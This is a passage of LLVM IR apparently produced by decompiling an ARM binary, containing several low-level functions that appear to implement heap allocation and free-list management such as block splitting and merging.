dec_label_pc_febc:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_febc = load i32, i32* @r4, align 4
  store i32 %v3_febc, i32* %stack_var_-24, align 4
  %v6_febc = load i32, i32* @r5, align 4
  %v9_febc = load i32, i32* @r6, align 4
  %v12_febc = load i32, i32* @r7, align 4
  %v15_febc = load i32, i32* @r8, align 4
  %v18_febc = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_fec0 = icmp eq i32 %arg2, 0
  %v0_fec4 = load i32, i32* @r0, align 4
  store i32 %v0_fec4, i32* @r7, align 4
  br i1 %v2_fec0, label %dec_label_pc_fecc, label %dec_label_pc_fed4

dec_label_pc_fecc:                                ; preds = %dec_label_pc_febc
  %v0_fecc = call i32 @function_fdcc()
  %v0_fedc.pre = load i32, i32* @r4, align 4
  %v2_fee0.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_fedc

dec_label_pc_fed4:                                ; preds = %dec_label_pc_febc
  %v2_fed4 = icmp eq i32 %v0_fec4, 0
  br i1 %v2_fed4, label %dec_label_pc_fedc, label %dec_label_pc_fee8

dec_label_pc_fedc:                                ; preds = %dec_label_pc_fed4, %dec_label_pc_fecc
  %v2_fee0 = phi i32 [ %v3_febc, %dec_label_pc_fed4 ], [ %v2_fee0.pre, %dec_label_pc_fecc ]
  %v0_fedc = phi i32 [ %arg2, %dec_label_pc_fed4 ], [ %v0_fedc.pre, %dec_label_pc_fecc ]
  store i32 %v2_fee0, i32* @r4, align 4
  store i32 %v6_febc, i32* @r5, align 4
  store i32 %v9_febc, i32* @r6, align 4
  store i32 %v12_febc, i32* @r7, align 4
  store i32 %v18_febc, i32* @lr, align 4
  %v1_fee4 = call i32 @function_fc78(i32 %v0_fedc)
  %v0_fee8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fee8

dec_label_pc_fee8:                                ; preds = %dec_label_pc_fed4, %dec_label_pc_fedc
  %v0_ff00 = phi i32 [ %v0_fec4, %dec_label_pc_fed4 ], [ %v1_fee4, %dec_label_pc_fedc ]
  %v0_fee8 = phi i32 [ %arg2, %dec_label_pc_fed4 ], [ %v0_fee8.pre, %dec_label_pc_fedc ]
  %v1_fee8 = add i32 %v0_fee8, 7
  %v1_feec = and i32 %v1_fee8, -4
  store i32 %v1_feec, i32* @r5, align 4
  %v2_fef0 = icmp ugt i32 %v1_feec, 10
  %v1_fef4 = add i32 %v0_ff00, -4
  %v2_fef4 = inttoptr i32 %v1_fef4 to i32*
  %v3_fef4 = load i32, i32* %v2_fef4, align 4
  store i32 %v3_fef4, i32* @r6, align 4
  br i1 %v2_fef0, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_fee8
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_fee8, %bb
  %v0_ff7c = phi i32 [ %v1_feec, %dec_label_pc_fee8 ], [ 12, %bb ]
  store i32 %v1_fef4, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_ff7c, %v3_fef4
  br i1 %tmp, label %dec_label_pc_ff08, label %dec_label_pc_ff7c

dec_label_pc_ff08:                                ; preds = %bb14
  %v2_fefc = sub i32 %v0_ff7c, %v3_fef4
  %v1_ff18 = call i32 @function_10d4c()
  %v0_ff20 = load i32, i32* @r8, align 4
  %v1_ff20 = load i32, i32* @r6, align 4
  %v2_ff20 = add i32 %v1_ff20, %v0_ff20
  %v4_ff28 = call i32 @function_10068(i32* bitcast (i32** @global_var_18234.444 to i32*), i32 %v2_ff20, i32 %v2_fefc)
  store i32 %v4_ff28, i32* @r4, align 4
  store i32 65344, i32* @lr, align 4
  %v1_ff3c = call i32 @function_10d4c()
  %v0_ff40 = load i32, i32* @r4, align 4
  %v2_ff40 = icmp eq i32 %v0_ff40, 0
  br i1 %v2_ff40, label %dec_label_pc_ff50, label %.thread

.thread:                                          ; preds = %dec_label_pc_ff08
  %v1_ff44 = load i32, i32* @r6, align 4
  %v3_ff44 = add i32 %v1_ff44, %v0_ff40
  %v2_ff48 = load i32, i32* @r7, align 4
  %v3_ff48 = add i32 %v2_ff48, -4
  %v4_ff48 = inttoptr i32 %v3_ff48 to i32*
  store i32 %v3_ff44, i32* %v4_ff48, align 4
  br label %dec_label_pc_ffbc

dec_label_pc_ff50:                                ; preds = %dec_label_pc_ff08
  %v0_ff50 = load i32, i32* @r5, align 4
  %v1_ff50 = add i32 %v0_ff50, -4
  %v1_ff54 = call i32 @function_fc78(i32 %v1_ff50)
  store i32 %v1_ff54, i32* @r0, align 4
  store i32 %v1_ff54, i32* @r4, align 4
  %v2_ff58 = icmp eq i32 %v1_ff54, 0
  br i1 %v2_ff58, label %dec_label_pc_ff74, label %dec_label_pc_ff60

dec_label_pc_ff60:                                ; preds = %dec_label_pc_ff50
  %v0_ff60 = load i32, i32* @r6, align 4
  %v1_ff60 = add i32 %v0_ff60, -4
  store i32 %v1_ff60, i32* @r2, align 4
  %v0_ff64 = load i32, i32* @r7, align 4
  store i32 %v0_ff64, i32* @r1, align 4
  %v0_ff68 = call i32 @function_ef60()
  %v0_ff6c = load i32, i32* @r7, align 4
  store i32 %v0_ff6c, i32* @r0, align 4
  %v0_ff70 = call i32 @function_fdcc()
  %v0_ff74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ff74

dec_label_pc_ff74:                                ; preds = %dec_label_pc_ff50, %dec_label_pc_ff60
  %v0_ff74 = phi i32 [ 0, %dec_label_pc_ff50 ], [ %v0_ff74.pre, %dec_label_pc_ff60 ]
  store i32 %v0_ff74, i32* @r7, align 4
  br label %dec_label_pc_ffbc

dec_label_pc_ff7c:                                ; preds = %bb14
  %v1_ff7c = add i32 %v0_ff7c, 28
  %tmp15 = icmp ugt i32 %v1_ff7c, %v3_fef4
  br i1 %tmp15, label %dec_label_pc_ffbc, label %dec_label_pc_ff88

dec_label_pc_ff88:                                ; preds = %dec_label_pc_ff7c
  %v1_ff94 = call i32 @function_10d4c()
  %v0_ff98 = load i32, i32* @r8, align 4
  %v1_ff98 = load i32, i32* @r5, align 4
  %v2_ff98 = add i32 %v1_ff98, %v0_ff98
  %v1_ff9c = load i32, i32* @r6, align 4
  %v2_ff9c = sub i32 %v1_ff9c, %v1_ff98
  %v4_ffa4 = call i32 @function_10128(i32* bitcast (i32** @global_var_18234.444 to i32*), i32 %v2_ff98, i32 %v2_ff9c)
  store i32 65464, i32* @lr, align 4
  %v1_ffb4 = call i32 @function_10d4c()
  %v0_ffb8 = load i32, i32* @r5, align 4
  %v1_ffb8 = load i32, i32* @r7, align 4
  %v2_ffb8 = add i32 %v1_ffb8, -4
  %v3_ffb8 = inttoptr i32 %v2_ffb8 to i32*
  store i32 %v0_ffb8, i32* %v3_ffb8, align 4
  br label %dec_label_pc_ffbc

dec_label_pc_ffbc:                                ; preds = %.thread, %dec_label_pc_ff7c, %dec_label_pc_ff74, %dec_label_pc_ff88
  %v0_ffbc = load i32, i32* @r7, align 4
  store i32 %v9_febc, i32* @r6, align 4
  store i32 %v15_febc, i32* @r8, align 4
  ret i32 %v0_ffbc

; uselistorder directives
  uselistorder i32 %v1_ff98, { 1, 0 }
  uselistorder i32 %v0_ff7c, { 1, 2, 0 }
  uselistorder i32 %v3_fef4, { 0, 2, 1, 3 }
  uselistorder i32** @global_var_18234.444, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_18234.444 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_ffbc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_ff74, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_fee8, { 1, 0 }
}

define i32 @function_ffd4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ffd4:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_ffd4 = inttoptr i32 %arg2 to i32*
  %v2_ffd4 = load i32, i32* %v1_ffd4, align 4
  %v3_ffd8 = load i32, i32* @r4, align 4
  store i32 %v3_ffd8, i32* %stack_var_-8, align 4
  %v1_ffdc = add i32 %v2_ffd4, 3
  %v1_ffe0 = and i32 %v1_ffdc, -4
  store i32 %v1_ffe0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_ffe8 = icmp ugt i32 %v1_ffe0, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_fff0 = load i32, i32* %arg1, align 4
  store i32 %v2_fff0, i32* %r0.global-to-local, align 4
  br i1 %v2_ffe8, label %dec_label_pc_1005c.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_ffd4
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1005c.preheader

dec_label_pc_1005c.preheader:                     ; preds = %dec_label_pc_ffd4, %bb
  %v1_10010 = phi i32 [ %v1_ffe0, %dec_label_pc_ffd4 ], [ 12, %bb ]
  %v2_1005c9 = icmp eq i32 %v2_fff0, 0
  br i1 %v2_1005c9, label %dec_label_pc_10064, label %dec_label_pc_fffc

dec_label_pc_fffc:                                ; preds = %dec_label_pc_1005c.preheader, %dec_label_pc_10058
  %v2_10014 = phi i32 [ %v3_10058, %dec_label_pc_10058 ], [ %v2_fff0, %dec_label_pc_1005c.preheader ]
  %v1_fffc = inttoptr i32 %v2_10014 to i32*
  %v2_fffc = load i32, i32* %v1_fffc, align 4
  store i32 %v2_fffc, i32* @ip, align 4
  %v3_10000 = icmp ult i32 %v2_fffc, %v1_10010
  br i1 %v3_10000, label %dec_label_pc_10058, label %dec_label_pc_10008

dec_label_pc_10008:                               ; preds = %dec_label_pc_fffc
  %v1_10008 = add i32 %v1_10010, 44
  %v3_1000c = icmp ult i32 %v2_fffc, %v1_10008
  br i1 %v3_1000c, label %dec_label_pc_1001c, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_10008
  %v2_10000.le = sub i32 %v2_fffc, %v1_10010
  store i32 %v2_10000.le, i32* %v1_fffc, align 4
  %v0_10048.pre = load i32, i32* @ip, align 4
  %v0_10050.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_1001c:                               ; preds = %dec_label_pc_10008
  %v1_1001c = add i32 %v2_10014, 4
  %v2_1001c = inttoptr i32 %v1_1001c to i32*
  %v3_1001c = load i32, i32* %v2_1001c, align 4
  store i32 %v3_1001c, i32* %r2.global-to-local, align 4
  %v2_10020 = icmp eq i32 %v3_1001c, 0
  br i1 %v2_10020, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_1001c
  %v2_10024 = add i32 %v2_10014, 8
  %v3_10024 = inttoptr i32 %v2_10024 to i32*
  %v4_10024 = load i32, i32* %v3_10024, align 4
  %v3_10028 = add i32 %v3_1001c, 8
  %v4_10028 = inttoptr i32 %v3_10028 to i32*
  store i32 %v4_10024, i32* %v4_10028, align 4
  %v0_1002c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1001c, %bb27
  %v0_1002c = phi i32 [ %v2_10014, %dec_label_pc_1001c ], [ %v0_1002c.pre, %bb27 ]
  %v1_1002c = add i32 %v0_1002c, 8
  %v2_1002c = inttoptr i32 %v1_1002c to i32*
  %v3_1002c = load i32, i32* %v2_1002c, align 4
  %v1_10030 = add i32 %v0_1002c, 4
  %v2_10030 = inttoptr i32 %v1_10030 to i32*
  %v3_10030 = load i32, i32* %v2_10030, align 4
  %v2_10034 = icmp eq i32 %v3_1002c, 0
  br i1 %v2_10034, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_10038 = add i32 %v3_1002c, 4
  %v4_10038 = inttoptr i32 %v3_10038 to i32*
  store i32 %v3_10030, i32* %v4_10038, align 4
  %v1_10040 = load i32, i32* @ip, align 4
  store i32 %v1_10040, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_1003c = load i32, i32* %r1.global-to-local, align 4
  %v3_1003c = inttoptr i32 %v2_1003c to i32*
  store i32 %v3_10030, i32* %v3_1003c, align 4
  %v1_10044.pre = load i32, i32* @ip, align 4
  store i32 %v1_10044.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_10050 = phi i32 [ %v0_10050.pre, %.thread._crit_edge ], [ %v1_10040, %bb28 ], [ %v1_10044.pre, %.thread5 ]
  %v0_10048 = phi i32 [ %v0_10048.pre, %.thread._crit_edge ], [ %v1_10040, %bb28 ], [ %v1_10044.pre, %.thread5 ]
  %v1_10048 = load i32, i32* %r0.global-to-local, align 4
  %v2_10048 = sub i32 %v1_10048, %v0_10048
  %v1_1004c = add i32 %v2_10048, 12
  store i32 %v1_1004c, i32* %r0.global-to-local, align 4
  %v1_10050 = load i32, i32* %r4.global-to-local, align 4
  %v2_10050 = inttoptr i32 %v1_10050 to i32*
  store i32 %v0_10050, i32* %v2_10050, align 4
  %v2_10054 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10054, i32* %r4.global-to-local, align 4
  ret i32 %v1_1004c

dec_label_pc_10058:                               ; preds = %dec_label_pc_fffc
  %v1_10058 = add i32 %v2_10014, 4
  %v2_10058 = inttoptr i32 %v1_10058 to i32*
  %v3_10058 = load i32, i32* %v2_10058, align 4
  store i32 %v3_10058, i32* %r0.global-to-local, align 4
  %v2_1005c = icmp eq i32 %v3_10058, 0
  br i1 %v2_1005c, label %dec_label_pc_1005c.dec_label_pc_10064_crit_edge, label %dec_label_pc_fffc

dec_label_pc_1005c.dec_label_pc_10064_crit_edge:  ; preds = %dec_label_pc_10058
  br label %dec_label_pc_10064

dec_label_pc_10064:                               ; preds = %dec_label_pc_1005c.dec_label_pc_10064_crit_edge, %dec_label_pc_1005c.preheader
  store i32 %v3_ffd8, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_10058, { 1, 2, 0 }
  uselistorder i32 %v0_1002c, { 1, 0 }
  uselistorder i32 %v2_fffc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10014, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_10010, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_fffc, { 1, 0 }
  uselistorder label %dec_label_pc_1005c.preheader, { 1, 0 }
}

define i32 @function_10068(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10068:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_1006c = load i32, i32* %arg1, align 4
  store i32 %v2_1006c, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_100e46 = icmp eq i32 %v2_1006c, 0
  br i1 %v2_100e46, label %dec_label_pc_100ec, label %dec_label_pc_10078

dec_label_pc_10078:                               ; preds = %dec_label_pc_10068, %dec_label_pc_100e0
  %v0_100b8 = phi i32 [ %v3_100e0, %dec_label_pc_100e0 ], [ %v2_1006c, %dec_label_pc_10068 ]
  %v1_10078 = inttoptr i32 %v0_100b8 to i32*
  %v2_10078 = load i32, i32* %v1_10078, align 4
  store i32 %v2_10078, i32* %r0.global-to-local, align 4
  %v2_1007c = sub i32 %v0_100b8, %v2_10078
  %v1_10080 = add i32 %v2_1007c, 12
  %v3_10084 = icmp uge i32 %v1_10080, %arg2
  %v9_10084 = icmp eq i32 %v1_10080, %arg2
  %v2_10088 = xor i1 %v9_10084, true
  %v3_10088 = and i1 %v3_10084, %v2_10088
  br i1 %v3_10088, label %dec_label_pc_100e0, label %dec_label_pc_1008c

dec_label_pc_1008c:                               ; preds = %dec_label_pc_10078
  br i1 %v9_10084, label %dec_label_pc_10090, label %dec_label_pc_100ec

dec_label_pc_10090:                               ; preds = %dec_label_pc_1008c
  %v1_10090 = add i32 %arg3, 3
  %v1_10094 = and i32 %v1_10090, -4
  store i32 %v1_10094, i32* %r2.global-to-local, align 4
  %v2_10098 = sub i32 %v2_10078, %v1_10094
  %v3_10098 = icmp ult i32 %v2_10078, %v1_10094
  br i1 %v3_10098, label %dec_label_pc_100ec, label %dec_label_pc_100a0

dec_label_pc_100a0:                               ; preds = %dec_label_pc_10090
  %v1_100a0 = add i32 %v1_10094, 44
  %v3_100a4 = icmp ult i32 %v2_10078, %v1_100a0
  br i1 %v3_100a4, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_100a0
  store i32 %v2_10098, i32* %v1_10078, align 4
  %v1_100b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_100b0, i32* %r0.global-to-local, align 4
  ret i32 %v1_100b0

.thread2:                                         ; preds = %dec_label_pc_100a0
  %v1_100b8 = add i32 %v0_100b8, 4
  %v2_100b8 = inttoptr i32 %v1_100b8 to i32*
  %v3_100b8 = load i32, i32* %v2_100b8, align 4
  store i32 %v3_100b8, i32* %r2.global-to-local, align 4
  %v2_100bc = icmp eq i32 %v3_100b8, 0
  br i1 %v2_100bc, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_100c0 = add i32 %v0_100b8, 8
  %v3_100c0 = inttoptr i32 %v2_100c0 to i32*
  %v4_100c0 = load i32, i32* %v3_100c0, align 4
  %v3_100c4 = add i32 %v3_100b8, 8
  %v4_100c4 = inttoptr i32 %v3_100c4 to i32*
  store i32 %v4_100c0, i32* %v4_100c4, align 4
  %v0_100c8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_100c8 = phi i32 [ %v0_100b8, %.thread2 ], [ %v0_100c8.pre, %bb17 ]
  %v1_100c8 = add i32 %v0_100c8, 8
  %v2_100c8 = inttoptr i32 %v1_100c8 to i32*
  %v3_100c8 = load i32, i32* %v2_100c8, align 4
  store i32 %v3_100c8, i32* %r2.global-to-local, align 4
  %v1_100cc = add i32 %v0_100c8, 4
  %v2_100cc = inttoptr i32 %v1_100cc to i32*
  %v3_100cc = load i32, i32* %v2_100cc, align 4
  %v2_100d0 = icmp eq i32 %v3_100c8, 0
  br i1 %v2_100d0, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_100d4 = add i32 %v3_100c8, 4
  %v4_100d4 = inttoptr i32 %v3_100d4 to i32*
  store i32 %v3_100cc, i32* %v4_100d4, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_100d8 = load i32, i32* %lr.global-to-local, align 4
  %v3_100d8 = inttoptr i32 %v2_100d8 to i32*
  store i32 %v3_100cc, i32* %v3_100d8, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_100dc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_100dc

dec_label_pc_100e0:                               ; preds = %dec_label_pc_10078
  %v1_100e0 = add i32 %v0_100b8, 4
  %v2_100e0 = inttoptr i32 %v1_100e0 to i32*
  %v3_100e0 = load i32, i32* %v2_100e0, align 4
  store i32 %v3_100e0, i32* %ip.global-to-local, align 4
  %v2_100e4 = icmp eq i32 %v3_100e0, 0
  br i1 %v2_100e4, label %dec_label_pc_100e4.dec_label_pc_100ec.loopexit_crit_edge, label %dec_label_pc_10078

dec_label_pc_100e4.dec_label_pc_100ec.loopexit_crit_edge: ; preds = %dec_label_pc_100e0
  br label %dec_label_pc_100ec

dec_label_pc_100ec:                               ; preds = %dec_label_pc_10090, %dec_label_pc_10068, %dec_label_pc_100e4.dec_label_pc_100ec.loopexit_crit_edge, %dec_label_pc_1008c
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_100e0, { 1, 2, 0 }
  uselistorder i32 %v0_100c8, { 1, 0 }
  uselistorder i32 %v1_10094, { 0, 2, 1, 3 }
  uselistorder i1 %v9_10084, { 1, 0 }
  uselistorder i32 %v2_10078, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_100b8, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_100ec, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_10078, { 1, 0 }
}

define i32 @function_100f4() local_unnamed_addr {
dec_label_pc_100f4:
  %v0_100f4 = load i32, i32* @r2, align 4
  %v2_100f4 = icmp eq i32 %v0_100f4, 0
  %v0_100f8 = load i32, i32* @r3, align 4
  %v1_100f8 = load i32, i32* @r1, align 4
  %v2_100f8 = add i32 %v1_100f8, 4
  %v3_100f8 = inttoptr i32 %v2_100f8 to i32*
  store i32 %v0_100f8, i32* %v3_100f8, align 4
  %v0_100fc = load i32, i32* @r2, align 4
  %v1_100fc = load i32, i32* @r1, align 4
  %v2_100fc = add i32 %v1_100fc, 8
  %v3_100fc = inttoptr i32 %v2_100fc to i32*
  store i32 %v0_100fc, i32* %v3_100fc, align 4
  %v1_10104 = load i32, i32* @r1, align 4
  br i1 %v2_100f4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_100f4
  %v2_10100 = load i32, i32* @r2, align 4
  %v3_10100 = add i32 %v2_10100, 4
  %v4_10100 = inttoptr i32 %v3_10100 to i32*
  store i32 %v1_10104, i32* %v4_10100, align 4
  br label %bb1

.thread:                                          ; preds = %dec_label_pc_100f4
  %v2_10104 = load i32, i32* @r0, align 4
  %v3_10104 = inttoptr i32 %v2_10104 to i32*
  store i32 %v1_10104, i32* %v3_10104, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_10108 = load i32, i32* @r3, align 4
  %v2_10108 = icmp eq i32 %v0_10108, 0
  br i1 %v2_10108, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_1010c = load i32, i32* @r1, align 4
  %v3_1010c = add i32 %v0_10108, 8
  %v4_1010c = inttoptr i32 %v3_1010c to i32*
  store i32 %v1_1010c, i32* %v4_1010c, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_10110 = load i32, i32* @r0, align 4
  ret i32 %v1_10110

; uselistorder directives
  uselistorder i32 %v1_10104, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_10114() local_unnamed_addr {
dec_label_pc_10114:
  %v0_10114 = load i32, i32* @r2, align 4
  %v2_10114 = icmp eq i32 %v0_10114, 0
  %v1_10118 = load i32, i32* @r1, align 4
  br i1 %v2_10114, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_10114
  %v2_10118 = load i32, i32* @r0, align 4
  %v3_10118 = inttoptr i32 %v2_10118 to i32*
  store i32 %v1_10118, i32* %v3_10118, align 4
  br label %bb2

.thread:                                          ; preds = %dec_label_pc_10114
  %v3_1011c = add i32 %v0_10114, 4
  %v4_1011c = inttoptr i32 %v3_1011c to i32*
  store i32 %v1_10118, i32* %v4_1011c, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_10120 = load i32, i32* @r2, align 4
  %v1_10120 = load i32, i32* @r1, align 4
  %v2_10120 = add i32 %v1_10120, 8
  %v3_10120 = inttoptr i32 %v2_10120 to i32*
  store i32 %v0_10120, i32* %v3_10120, align 4
  %v1_10124 = load i32, i32* @r0, align 4
  ret i32 %v1_10124

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_10128(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10128:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10128 = load i32, i32* @r4, align 4
  store i32 %v3_10128, i32* %stack_var_-20, align 4
  %v2_1012c = load i32, i32* %arg1, align 4
  store i32 %v2_1012c, i32* %r4.global-to-local, align 4
  %v2_10130 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1014c2 = icmp eq i32 %v2_1012c, 0
  br i1 %v2_1014c2, label %dec_label_pc_101fc, label %dec_label_pc_1013c

dec_label_pc_1013c:                               ; preds = %dec_label_pc_10128, %dec_label_pc_10144
  %v0_1018c = phi i32 [ %v0_10194, %dec_label_pc_10144 ], [ 0, %dec_label_pc_10128 ]
  %v0_10194 = phi i32 [ %v3_10148, %dec_label_pc_10144 ], [ %v2_1012c, %dec_label_pc_10128 ]
  %v1_101505.in = phi i32 [ %v3_10148, %dec_label_pc_10144 ], [ %v2_1012c, %dec_label_pc_10128 ]
  %v1_101505 = add i32 %v1_101505.in, 12
  %v3_1013c = icmp ult i32 %v1_101505, %arg2
  br i1 %v3_1013c, label %dec_label_pc_10144, label %dec_label_pc_1015c

dec_label_pc_10144:                               ; preds = %dec_label_pc_1013c
  store i32 %v0_10194, i32* %r6.global-to-local, align 4
  %v1_10148 = add i32 %v0_10194, 4
  %v2_10148 = inttoptr i32 %v1_10148 to i32*
  %v3_10148 = load i32, i32* %v2_10148, align 4
  store i32 %v3_10148, i32* %r4.global-to-local, align 4
  %v2_1014c = icmp eq i32 %v3_10148, 0
  br i1 %v2_1014c, label %dec_label_pc_1014c.dec_label_pc_101fc.loopexit_crit_edge, label %dec_label_pc_1013c

dec_label_pc_1015c:                               ; preds = %dec_label_pc_1013c
  %v1_1015c = inttoptr i32 %v0_10194 to i32*
  %v2_1015c = load i32, i32* %v1_1015c, align 4
  store i32 %v2_1015c, i32* @ip, align 4
  %v2_10160 = sub i32 %v0_10194, %v2_1015c
  %v1_10164 = add i32 %v2_10160, 12
  %v3_10168 = icmp uge i32 %v1_10164, %v2_10130
  %v9_10168 = icmp eq i32 %v1_10164, %v2_10130
  %v2_1016c = xor i1 %v9_10168, true
  %v3_1016c = and i1 %v3_10168, %v2_1016c
  br i1 %v3_1016c, label %dec_label_pc_101fc, label %dec_label_pc_10170

dec_label_pc_10170:                               ; preds = %dec_label_pc_1015c
  %v2_10170 = add i32 %v2_1015c, %arg3
  store i32 %v2_10170, i32* %r7.global-to-local, align 4
  br i1 %v9_10168, label %dec_label_pc_10178, label %dec_label_pc_101a4

dec_label_pc_10178:                               ; preds = %dec_label_pc_10170
  %v2_10178 = icmp eq i32 %v0_1018c, 0
  br i1 %v2_10178, label %dec_label_pc_101f0, label %dec_label_pc_10180

dec_label_pc_10180:                               ; preds = %dec_label_pc_10178
  %v1_10180 = add i32 %v0_1018c, 12
  %v9_10184 = icmp eq i32 %v1_10180, %arg2
  br i1 %v9_10184, label %dec_label_pc_1018c, label %dec_label_pc_101f0

dec_label_pc_1018c:                               ; preds = %dec_label_pc_10180
  %v1_1018c = inttoptr i32 %v0_1018c to i32*
  %v2_1018c = load i32, i32* %v1_1018c, align 4
  %v1_10190 = add i32 %v0_1018c, 8
  %v2_10190 = inttoptr i32 %v1_10190 to i32*
  %v3_10190 = load i32, i32* %v2_10190, align 4
  store i32 %v3_10190, i32* @r2, align 4
  store i32 %v0_10194, i32* @r1, align 4
  %v2_10198 = add i32 %v2_1018c, %v2_10170
  store i32 %v2_10198, i32* %r7.global-to-local, align 4
  %v0_1019c = call i32 @function_10114()
  br label %dec_label_pc_101f0

dec_label_pc_101a4:                               ; preds = %dec_label_pc_10170
  %v1_101a4 = add i32 %v0_10194, 4
  %v2_101a4 = inttoptr i32 %v1_101a4 to i32*
  %v3_101a4 = load i32, i32* %v2_101a4, align 4
  store i32 %v3_101a4, i32* %r5.global-to-local, align 4
  %v2_101a8 = icmp eq i32 %v3_101a4, 0
  br i1 %v2_101a8, label %dec_label_pc_101dc, label %dec_label_pc_101b0

dec_label_pc_101b0:                               ; preds = %dec_label_pc_101a4
  %v1_101b0 = inttoptr i32 %v3_101a4 to i32*
  %v2_101b0 = load i32, i32* %v1_101b0, align 4
  store i32 %v2_101b0, i32* @ip, align 4
  %v2_101b4 = sub i32 %v3_101a4, %v2_101b0
  %v1_101b8 = add i32 %v2_101b4, 12
  %v9_101bc = icmp eq i32 %v2_10130, %v1_101b8
  br i1 %v9_101bc, label %dec_label_pc_101c4, label %dec_label_pc_101dc

dec_label_pc_101c4:                               ; preds = %dec_label_pc_101b0
  store i32 %v0_1018c, i32* @r2, align 4
  store i32 %v3_101a4, i32* @r1, align 4
  %v2_101cc = add i32 %v2_101b0, %v2_10170
  store i32 %v2_101cc, i32* %r7.global-to-local, align 4
  %v0_101d0 = call i32 @function_10114()
  %v0_101d4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_101d4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_101f0

dec_label_pc_101dc:                               ; preds = %dec_label_pc_101b0, %dec_label_pc_101a4
  %v2_101dc = add i32 %v0_10194, %arg3
